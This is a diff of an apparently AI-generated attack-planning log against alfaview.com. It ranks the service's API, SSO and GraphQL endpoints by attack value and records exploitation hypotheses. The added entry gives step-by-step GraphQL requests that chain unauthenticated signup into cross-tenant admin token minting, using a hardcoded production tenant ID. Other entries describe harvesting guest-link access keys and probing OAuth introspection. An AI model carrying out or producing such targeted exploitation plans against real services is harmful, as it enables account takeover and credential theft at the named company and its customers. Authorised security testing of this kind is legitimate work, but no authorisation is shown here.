@@ -1,10 +1,18 @@
-## 2026-10-12 17:59:31 UTC [target] (model nemotron3)
-[PRIO] apis.alfaview.com/v2/rooms/{roomId}/permissions (CreatePermissions),8.05,attack_surface=8,business_value=9,tech_exposure=8,gate_ease=1,cloud_surface=5,freshness=3
-[PRIO] sso.alfaview.com/oauth2/introspect,7.80,attack_surface=7,business_value=8,tech_exposure=9,gate_ease=5,cloud_surface=5,freshness=2
-[PRIO] app.alfaview.com/graphql (adminSwitchCompany),7.60,attack_surface=7,business_value=9,tech_exposure=8,gate_ease=1,cloud_surface=6,freshness=2
-[PRIO] apis.alfaview.com/v2/guest-links + /v2/group-links,7.45,attack_surface=7,business_value=8,tech_exposure=7,gate_ease=1,cloud_surface=5,freshness=3
-[PRIO] tools.alfaview.com/whiteboard/,6.65,attack_surface=6,business_value=6,tech_exposure=7,gate_ease=5,cloud_surface=4,freshness=5
-[PRIO] apis.alfaview.com/v2/audit-log,6.20,attack_surface=6,business_value=7,tech_exposure=6,gate_ease=10,cloud_surface=5,freshness=8
+## 2026-10-12 23:54:26 UTC [target] (model nemotron3)
+[PRIO] app.alfaview.com/graphql (signup + adminSwitchCompany), 8.75, attack_surface=9, business_value=9, tech_exposure=9, gate_ease=10, cloud_surface=6, freshness=8
+[PRIO] sso.alfaview.com/oauth2/introspect, 8.10, attack_surface=8, business_value=8, tech_exposure=8, gate_ease=10, cloud_surface=7, freshness=7
+[PRIO] apis.alfaview.com/v2/guest-links + /v2/group-links, 7.85, attack_surface=8, business_value=9, tech_exposure=7, gate_ease=1, cloud_surface=6, freshness=8
+[PRIO] tools.alfaview.com/whiteboard/, 6.50, attack_surface=6, business_value=6, tech_exposure=7, gate_ease=5, cloud_surface=4, freshness=6
+[PRIO] apis.alfaview.com/v2/audit-log, 6.20, attack_surface=6, business_value=7, tech_exposure=6, gate_ease=1, cloud_surface=5, freshness=7
+[HYP] Unauthenticated signup → valid bearer token → cross-tenant admin token minting via adminSwitchCompany
+class: AUTH
+asset: app.alfaview.com/graphql (mutation Signup, FinishSignup, adminSwitchCompany)
+confidence: 85
+reasoning: Public bundle (md5 2cb91283) exposes Signup (no token header), FinishSignup (email-gated), adminSwitchCompany($nextCompanyId:String!)→{companyId,accessToken,permissions} with no administration proof; hardcoded production tenant IDs (alfatraining-internal, 01FDY0986YK1BJF2K0F9DXR8EB); edge-proxy 401 uniform (www-authenticate: AccessToken) indicates admin GraphQL token header and REST Authorization share gateway
+evidence_needed: Valid bearer from signup→finishSignup; adminSwitchCompany with foreign companyId returns 200 with new accessToken/permissions; returned token works on apis.alfaview.com/v2/users/me
+verify_steps: POST https://app.alfaview.com/graphql {query:"mutation{signup(email:\"test@attacker.com\"){success}}"} → 200; wait email → POST {query:"mutation{finishSignup(companyId:\"...\",username:\"...\",activationToken:\"...\",password:\"...\"){accessToken}}"} → 200 with token; POST {query:"mutation{adminSwitchCompany(nextCompanyId:\"01FDY0986YK1BJF2K0F9DXR8EB\"){companyId,accessToken,permissions}}", headers:{token:<token>}} → 200 with cross-tenant token
+impact: Cross-tenant admin takeover → full company administration via minted token (CRITICAL, OWASP A01:2021)
+testability: HUMAN_ONLY
 [HYP] OAuth2 introspection discloses metadata for any leaked opaque alfaview token with zero valid client credentials
 class: AUTH
 asset: sso.alfaview.com/oauth2/introspect
@@ -22,15 +30,6 @@ reasoning: ListGuestLinks takes only pageToken+limit (no roomId/companyId filter
 evidence_needed: Authenticated GET /v2/guest-links with valid bearer → observe 200 with GuestLink[] including accessKey; GET /v2/group-links → 200 with GroupLink[]; POST /v2/auth/guest-link with {companyId, roomId, accessKey} from enumeration → 200 GuestLinkAuthenticationInfo with accessToken
 verify_steps: GET https://apis.alfaview.com/v2/guest-links (with valid Authorization: <token>) → 200 with GuestLink[] including accessKey; GET https://apis.alfaview.com/v2/group-links → 200 with GroupLink[]; POST https://apis.alfaview.com/v2/auth/guest-link with {companyId, roomId, accessKey} from enumeration → 200 GuestLinkAuthenticationInfo with accessToken
 impact: Cross-tenant guest credential harvesting → room access via stolen accessKey, dial-in codes, join URLs (CRITICAL, OWASP A01:2021)
-testability: AUTH_HELPED
-[HYP] Public bundle discloses cross-tenant admin token minting via adminSwitchCompany with no administration proof
-class: AUTH
-asset: app.alfaview.com/graphql (adminSwitchCompany mutation)
-confidence: 85
-reasoning: Bundle (md5 2cb9128353b1f7444e222b4f61e4ffa5) contains adminSwitchCompany($nextCompanyId: String!) → {companyId, accessToken, permissions}; caller supplies only current token + target companyId; no proof of administering target company required in signature; hardcoded production tenant IDs (alfatraining-internal, 01FDY0986YK1BJF2K0F9DXR8EB) in bundle; adminAccessToken written to localStorage at two sites; edge-proxy 401 uniform (www-authenticate: AccessToken) indicates admin GraphQL token header and REST Authorization share gateway
-evidence_needed: Authenticated adminSwitchCompany with foreign companyId → 200 with new accessToken/permissions; verify token works on target company's resources
-verify_steps: POST https://app.alfaview.com/graphql with {query: "mutation { adminSwitchCompany(nextCompanyId: \"01FDY0986YK1BJF2K0F9DXR8EB\") { companyId accessToken permissions } }", headers: {token: <valid-admin-token>}} → observe 200 with accessToken; repeat with random UUID → 403/404; test returned token on apis.alfaview.com/v2/users/me
-impact: Cross-tenant admin takeover → full company administration via minted token (CRITICAL, OWASP A01:2021)
 testability: AUTH_HELPED
 [PARKED] tools.alfaview.com/whiteboard/ BOLA: No service/method enumeration oracle exists (flat code:5 for all verbs); no auth challenge observed but no credential to test; zero client references in bundle — attack surface unmapped but unverifiable without valid token
 [PARKED] apis.alfaview.com/v2/rooms/{roomId}/permissions CreatePermissions IDOR chain: Requires valid participantId from guest-links enumeration (itself AUTH_HELPED) + roomId; chain confidence capped by guest-links gate
